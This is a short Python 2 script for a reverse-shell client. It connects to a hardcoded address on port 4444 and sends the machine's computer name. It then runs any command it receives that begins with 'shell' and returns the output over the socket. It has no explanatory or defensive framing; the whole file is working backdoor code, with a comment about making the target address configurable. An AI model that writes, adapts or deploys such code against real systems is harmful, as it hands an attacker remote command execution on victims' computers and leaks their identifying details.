import socket, os, subprocess
def connect():
    os.system('cls')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # go back and make the next two lines dynamic
    port = 4444
    host = '192.168.0.121'
    try:
        print '[!] Trying to connect to %s:%s'%(host, port)
        s.connect((host,port))
        print '[*] Connection Successful!'
        s.send(os.environ['COMPUTERNAME'])
    except:
        print 'Could not connect.'
def receive():
    receive = s.recv(1024)
    if receive == 'quit':
        s.close()
    elif receive[0:5] == 'shell':
        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_value
    else:
        args = 'no valid input given'
    send(args)
def send(args):
    send = s.send(args)
    receive()
connect()
receive()
s.close()


